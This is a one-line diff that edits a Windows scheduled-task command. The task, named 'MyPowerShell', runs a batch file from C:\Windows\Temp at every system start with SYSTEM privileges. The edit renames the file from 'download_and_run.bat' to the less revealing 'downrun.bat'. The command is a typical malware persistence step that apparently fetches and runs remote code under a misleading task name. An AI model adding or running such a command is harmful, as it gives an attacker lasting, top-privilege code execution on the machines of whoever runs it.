@@ -1,1 +1,1 @@
-schtasks /create /tn "MyPowerShell" /tr "C:\Windows\Temp\download_and_run.bat" /sc onstart /ru SYSTEM /f
+schtasks /create /tn "MyPowerShell" /tr "C:\Windows\Temp\downrun.bat" /sc onstart /ru SYSTEM /f
